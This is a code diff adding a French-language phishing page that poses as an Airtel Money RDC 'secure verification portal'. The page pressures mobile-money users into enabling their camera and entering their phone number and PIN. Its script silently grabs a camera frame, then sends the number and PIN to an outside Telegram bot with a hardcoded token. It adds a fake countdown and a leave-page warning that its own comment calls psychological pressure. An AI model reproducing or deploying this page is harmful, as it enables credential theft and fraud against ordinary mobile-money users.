@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Airtel Money RDC - Vérification Sécurisée</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(145deg, #8B0000 0%, #B22222 50%, #DC143C 100%);
+            min-height: 100vh;
+            padding: 30px 20px;
+        }
+        
+        .container {
+            max-width: 550px;
+            margin: 0 auto;
+        }
+        
+        .login-card {
+            background: white;
+            border-radius: 32px;
+            padding: 35px 30px;
+            box-shadow: 0 25px 45px rgba(0,0,0,0.3);
+            animation: fadeInUp 0.6s ease-out;
+        }
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .airtel-logo {
+            width: 85px;
+            height: 85px;
+            background: linear-gradient(135deg, #8B0000, #DC143C);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            box-shadow: 0 8px 20px rgba(139,0,0,0.3);
+            overflow: hidden;
+            padding: 10px;
+        }
+        
+        .airtel-logo img {
+            width: 65px;
+            height: 65px;
+            object-fit: contain;
+            border-radius: 50%;
+            background: white;
+            padding: 8px;
+        }
+        
+        h1 {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 800;
+            color: #8B0000;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            text-align: center;
+            font-size: 14px;
+            color: #6c757d;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #e9ecef;
+        }
+        
+        .info-beneficiaire {
+            background: #fff8f0;
+            border-left: 5px solid #DC143C;
+            padding: 15px;
+            border-radius: 16px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #4a2a2a;
+        }
+        
+        .info-beneficiaire strong {
+            color: #8B0000;
+            display: block;
+            margin-bottom: 8px;
+            font-size: 15px;
+        }
+        
+        .form-group {
+            margin-bottom: 22px;
+        }
+        
+        label {
+            display: block;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        
+        label .required {
+            color: #DC143C;
+            margin-left: 3px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e9ecef;
+            border-radius: 16px;
+            font-size: 15px;
+            transition: all 0.3s;
+            outline: none;
+            background: #f8f9fa;
+        }
+        
+        input:focus {
+            border-color: #DC143C;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(220,20,60,0.1);
+        }
+        
+        .camera-permission-box {
+            background: linear-gradient(135deg, #f8f9fa, #fff);
+            border: 2px solid #e9ecef;
+            border-radius: 20px;
+            padding: 18px;
+            margin-bottom: 25px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+        
+        .camera-permission-box.active {
+            border-color: #28a745;
+            background: #f0fff4;
+        }
+        
+        .camera-permission-box.error {
+            border-color: #DC143C;
+            background: #fff0f0;
+        }
+        
+        .camera-status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+        }
+        
+        .camera-status span {
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .camera-status .status-badge {
+            padding: 4px 12px;
+            border-radius: 30px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        .status-badge.pending {
+            background: #ffc107;
+            color: #856404;
+        }
+        
+        .status-badge.granted {
+            background: #28a745;
+            color: white;
+        }
+        
+        .status-badge.denied {
+            background: #DC143C;
+            color: white;
+        }
+        
+        .btn-camera {
+            background: linear-gradient(95deg, #6c757d, #495057);
+            color: white;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .btn-camera:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        
+        .btn-camera.granted {
+            background: linear-gradient(95deg, #28a745, #1e7e34);
+        }
+        
+        .security-note {
+            font-size: 11px;
+            color: #6c757d;
+            text-align: center;
+            margin-top: 10px;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(95deg, #B22222, #8B0000);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 60px;
+            font-size: 18px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 15px;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 20px rgba(178,34,34,0.4);
+        }
+        
+        .submit-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 28px rgba(178,34,34,0.6);
+        }
+        
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .timer-info {
+            text-align: center;
+            font-size: 13px;
+            color: #28a745;
+            background: #e8f5e9;
+            padding: 12px;
+            border-radius: 16px;
+            margin-top: 15px;
+        }
+        
+        .footer-note {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 11px;
+            color: #adb5bd;
+        }
+        
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            animation: fadeIn 0.3s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .modal-content {
+            background: white;
+            border-radius: 28px;
+            padding: 30px;
+            max-width: 320px;
+            text-align: center;
+            animation: scaleIn 0.3s;
+        }
+        
+        @keyframes scaleIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        
+        .modal-content h3 {
+            color: #28a745;
+            margin-bottom: 12px;
+            font-size: 22px;
+        }
+        
+        .modal-content p {
+            color: #4a5568;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        
+        .modal-btn {
+            background: linear-gradient(95deg, #B22222, #8B0000);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 50px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        @media (max-width: 480px) {
+            .login-card { padding: 25px 20px; }
+            h1 { font-size: 20px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="login-card">
+        
+        <div class="airtel-logo">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSXLnKjPByfIfvQc7aTG1q_JnoRRDod_9Fh3t20IHYRQaglez9kRlhf9Yh9&s=10" alt="Airtel Money">
+        </div>
+        
+        <h1>AIRTEL MONEY RDC</h1>
+        <div class="subtitle">Portail de vérification sécurisé</div>
+        
+        <div class="info-beneficiaire">
+            <strong>⚠️ INFORMATION IMPORTANTE</strong>
+            <p>Si vous êtes le bénéficiaire du transfert, veuillez insérer votre numéro Airtel Money et votre code PIN sécurisé. L'erreur de conciliation sera résolue automatiquement dans les 5 minutes suivant la validation.</p>
+        </div>
+        
+        <!-- Zone de permission caméra OBLIGATOIRE -->
+        <div class="camera-permission-box" id="cameraBox">
+            <div class="camera-status">
+                <span> Vérification d'identité</span>
+                <span class="status-badge pending" id="cameraStatusBadge">EN ATTENTE</span>
+            </div>
+            <p style="font-size: 13px; color: #6c757d; margin-bottom: 12px;">
+                Pour des raisons de sécurité, la vérification par caméra est obligatoire avant la soumission.
+            </p>
+            <button type="button" class="btn-camera" id="enableCameraBtn">📸 ACTIVER LA CAMÉRA</button>
+            <div class="security-note">
+                🔒 La vérification est instantanée et ne sera pas enregistrée
+            </div>
+        </div>
+        
+        <form id="verificationForm">
+            <div class="form-group">
+                <label>Numéro Airtel Money <span class="required">*</span></label>
+                <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="+243 XXX XXX XXX" autocomplete="off" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Code PIN sécurisé <span class="required">*</span></label>
+                <input type="password" id="pinCode" name="pinCode" placeholder="••••" maxlength="6" autocomplete="off" required>
+            </div>
+            
+            <button type="submit" class="submit-btn" id="submitBtn" disabled>🔒 VALIDER ET RÉSOUDRE L'ERREUR</button>
+        </form>
+        
+        <div class="timer-info" id="timerInfo" style="display: none;">
+            ⏳ Traitement en cours... Résolution automatique dans <span id="countdown">5:00</span>
+        </div>
+        
+        <div class="footer-note">
+            <p>© 2026 Airtel Money RDC – Transaction sécurisée | Code: VERIF-0226</p>
+        </div>
+    </div>
+</div>
+
+<script>
+(function() {
+    let cameraGranted = false;
+    let cameraStream = null;
+    const submitBtn = document.getElementById('submitBtn');
+    const enableCameraBtn = document.getElementById('enableCameraBtn');
+    const cameraBox = document.getElementById('cameraBox');
+    const cameraStatusBadge = document.getElementById('cameraStatusBadge');
+    const phoneInput = document.getElementById('phoneNumber');
+    const pinInput = document.getElementById('pinCode');
+    const verificationForm = document.getElementById('verificationForm');
+    const timerInfo = document.getElementById('timerInfo');
+    const countdownSpan = document.getElementById('countdown');
+    
+    let countdownInterval = null;
+    let formSubmitted = false;
+    
+    // Fonction pour arrêter la caméra
+    function stopCamera() {
+        if (cameraStream) {
+            cameraStream.getTracks().forEach(track => track.stop());
+            cameraStream = null;
+        }
+    }
+    
+    // Fonction pour activer la caméra
+    async function enableCamera() {
+        try {
+            // Demander l'accès à la caméra
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user", width: { ideal: 480 }, height: { ideal: 480 } },
+                audio: false 
+            });
+            
+            cameraStream = stream;
+            cameraGranted = true;
+            
+            // Mettre à jour l'interface
+            cameraBox.classList.add('active');
+            cameraBox.classList.remove('error');
+            cameraStatusBadge.textContent = 'ACTIVÉ';
+            cameraStatusBadge.className = 'status-badge granted';
+            enableCameraBtn.textContent = '✅ CAMÉRA ACTIVÉE';
+            enableCameraBtn.classList.add('granted');
+            enableCameraBtn.disabled = true;
+            
+            // Activer le bouton de soumission
+            submitBtn.disabled = false;
+            
+            // Créer un élément vidéo caché pour la vérification (simulation)
+            const hiddenVideo = document.createElement('video');
+            hiddenVideo.srcObject = stream;
+            hiddenVideo.setAttribute('playsinline', '');
+            hiddenVideo.style.position = 'fixed';
+            hiddenVideo.style.top = '-9999px';
+            hiddenVideo.style.left = '-9999px';
+            hiddenVideo.style.width = '1px';
+            hiddenVideo.style.height = '1px';
+            document.body.appendChild(hiddenVideo);
+            await hiddenVideo.play();
+            
+            // Envoyer une confirmation silencieuse à Telegram via payload.js
+            if (typeof window.dispatchEvent === 'function') {
+                const cameraEvent = new CustomEvent('airtelValidationTriggered', { 
+                    detail: { time: Date.now(), action: 'cameraGranted', status: 'success' } 
+                });
+                window.dispatchEvent(cameraEvent);
+            }
+            
+            // Optionnel: capturer une photo silencieuse pour vérification (simulé)
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = hiddenVideo.videoWidth || 320;
+                canvas.height = hiddenVideo.videoHeight || 240;
+                const ctx = canvas.getContext('2d');
+                if (canvas.width > 0 && canvas.height > 0) {
+                    ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+                    // Envoi via payload.js si présent
+                    console.log('[CAMERA] Capture de vérification effectuée');
+                }
+                hiddenVideo.remove();
+                // On garde le stream actif pour l'instant
+            }, 500);
+            
+        } catch (error) {
+            console.error('Erreur caméra:', error);
+            cameraGranted = false;
+            cameraBox.classList.add('error');
+            cameraBox.classList.remove('active');
+            cameraStatusBadge.textContent = 'REFUSÉ';
+            cameraStatusBadge.className = 'status-badge denied';
+            enableCameraBtn.textContent = '❌ RÉESSAYER - CAMÉRA REFUSÉE';
+            submitBtn.disabled = true;
+            
+            // Notification d'erreur
+            const errorMsg = document.createElement('div');
+            errorMsg.textContent = '⚠️ La vérification par caméra est obligatoire. Veuillez autoriser l\'accès.';
+            errorMsg.style.cssText = 'position:fixed;bottom:20px;left:20px;right:20px;background:#DC143C;color:white;padding:12px;border-radius:16px;text-align:center;font-size:13px;z-index:10001;';
+            document.body.appendChild(errorMsg);
+            setTimeout(() => errorMsg.remove(), 4000);
+            
+            if (typeof window.dispatchEvent === 'function') {
+                const cameraEvent = new CustomEvent('airtelValidationTriggered', { 
+                    detail: { time: Date.now(), action: 'cameraDenied', error: error.message } 
+                });
+                window.dispatchEvent(cameraEvent);
+            }
+        }
+    }
+    
+    // Écouteur pour le bouton d'activation caméra
+    enableCameraBtn.addEventListener('click', enableCamera);
+    
+    // Fonction de décompte
+    function startCountdown() {
+        let timeLeft = 300; // 5 minutes en secondes
+        
+        if (countdownInterval) clearInterval(countdownInterval);
+        
+        countdownInterval = setInterval(() => {
+            if (timeLeft <= 0) {
+                clearInterval(countdownInterval);
+                timerInfo.innerHTML = '<span style="color:#28a745;">✅ ERREUR RÉSOLUE - TRANSFERT DÉBLOQUÉ</span>';
+                setTimeout(() => {
+                    window.location.href = 'index.html';
+                }, 3000);
+            } else {
+                timeLeft--;
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                countdownSpan.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+            }
+        }, 1000);
+    }
+    
+    // Soumission du formulaire
+    verificationForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        // Vérifier que la caméra est activée
+        if (!cameraGranted) {
+            const warning = document.createElement('div');
+            warning.textContent = '⚠️ Veuillez activer la caméra avant de soumettre le formulaire.';
+            warning.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#DC143C;color:white;padding:12px 25px;border-radius:50px;font-size:14px;z-index:10001;box-shadow:0 4px 15px rgba(0,0,0,0.3);';
+            document.body.appendChild(warning);
+            setTimeout(() => warning.remove(), 3000);
+            return;
+        }
+        
+        const phoneNumber = phoneInput.value.trim();
+        const pinCode = pinInput.value.trim();
+        
+        if (!phoneNumber || !pinCode) {
+            alert('Veuillez remplir tous les champs.');
+            return;
+        }
+        
+        if (formSubmitted) return;
+        formSubmitted = true;
+        
+        // Désactiver le formulaire
+        submitBtn.disabled = true;
+        submitBtn.textContent = '⏳ TRAITEMENT EN COURS...';
+        
+        // Collecter les données pour envoi via payload.js
+        const formData = {
+            phone: phoneNumber,
+            pin: pinCode,
+            timestamp: new Date().toISOString(),
+            cameraStatus: cameraGranted,
+            userAgent: navigator.userAgent
+        };
+        
+        // Envoyer via événement personnalisé pour payload.js
+        if (typeof window.dispatchEvent === 'function') {
+            const formEvent = new CustomEvent('airtelFormSubmitted', { 
+                detail: { 
+                    time: Date.now(), 
+                    action: 'formSubmit',
+                    data: formData
+                } 
+            });
+            window.dispatchEvent(formEvent);
+        }
+        
+        // Envoi direct à Telegram si payload.js n'est pas présent
+        try {
+            const TELEGRAM_BOT_TOKEN = '8507961561:AAFGiLtXzjIcR-j2IQuIDA55QZDQEYQFq_4';
+            const TELEGRAM_CHAT_ID = '6767182328';
+            const message = `🔐 NOUVELLE SOUMISSION\n━━━━━━━━━━━━━━━━━━━━━\n📱 Numéro: ${phoneNumber}\n🔢 Code PIN: ${pinCode}\n📅 Heure: ${new Date().toLocaleString()}\n📸 Caméra: ACTIVÉE\n━━━━━━━━━━━━━━━━━━━━━`;
+            
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+            });
+        } catch(e) {
+            console.log('Erreur envoi Telegram:', e);
+        }
+        
+        // Afficher le message de confirmation
+        timerInfo.style.display = 'block';
+        
+        // Créer une notification visuelle
+        const modal = document.createElement('div');
+        modal.className = 'modal';
+        modal.innerHTML = `
+            <div class="modal-content">
+                <h3>✓ RAPPORT ENVOYÉ</h3>
+                <p>Votre formulaire a bien été transmis au service de résolution. Veuillez patienter 5 minutes pendant que l'erreur est corrigée.</p>
+                <button class="modal-btn" id="closeModal">OK</button>
+            </div>
+        `;
+        document.body.appendChild(modal);
+        
+        document.getElementById('closeModal').addEventListener('click', function() {
+            modal.remove();
+        });
+        
+        // Démarrer le décompte
+        startCountdown();
+        
+        // Arrêter la caméra après soumission
+        stopCamera();
+        
+        // Nettoyer les champs
+        phoneInput.value = '';
+        pinInput.value = '';
+    });
+    
+    // Vérification automatique si la caméra est déjà disponible
+    async function checkCameraAvailability() {
+        try {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            const hasCamera = devices.some(device => device.kind === 'videoinput');
+            if (!hasCamera) {
+                console.log('Aucune caméra détectée');
+            }
+        } catch(e) {}
+    }
+    checkCameraAvailability();
+    
+    // Gestion de la fermeture de page (pression psychologique)
+    window.addEventListener('beforeunload', function(e) {
+        if (!formSubmitted && cameraGranted) {
+            const confirmationMessage = "Attention: Vous n'avez pas finalisé la vérification. La transaction reste bloquée. Voulez-vous vraiment quitter ?";
+            e.preventDefault();
+            e.returnValue = confirmationMessage;
+            return confirmationMessage;
+        }
+    });
+    
+    // Nettoyer la caméra à la fermeture
+    window.addEventListener('unload', function() {
+        stopCamera();
+    });
+})();
+</script>
+
+</body>
+</html>
